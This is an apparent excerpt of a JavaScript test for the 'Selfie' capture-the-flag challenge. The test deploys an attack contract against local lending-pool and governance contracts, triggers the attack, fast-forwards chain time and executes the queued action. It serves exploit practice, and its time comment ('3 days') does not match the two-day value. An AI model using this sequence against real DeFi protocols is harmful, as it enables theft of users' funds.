...
describe("[Challenge] Selfie", function () {
  ...
  it("Exploit", async function () {
    ...
    const SelfieAttackContract = await ethers.getContractFactory(
      "SelfieAttack",
      attacker
    );
    const selfieAttack = await SelfieAttackContract.deploy(
      this.pool.address,
      this.governance.address,
      this.token.address,
      attacker.address
    ...
    await selfieAttack.attack();

    await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 3 days

    await selfieAttack.executeAttack();
  });
